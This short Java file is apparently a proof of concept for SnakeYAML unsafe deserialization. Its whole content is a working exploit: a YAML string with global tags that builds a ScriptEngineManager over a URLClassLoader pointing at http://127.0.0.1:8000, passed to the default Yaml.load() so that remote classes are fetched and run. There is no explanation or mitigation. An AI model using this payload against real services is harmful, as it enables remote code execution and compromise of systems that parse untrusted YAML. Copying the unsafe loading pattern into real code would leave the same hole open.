package cc.blbana.SnakeYaml;

import org.yaml.snakeyaml.Yaml;

public class SnakePayloadPoC {
    public static void main(String[] args) {
        String PoC = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8000\"]]]]";
        Yaml yaml = new Yaml();
        yaml.load(PoC);
    }
}
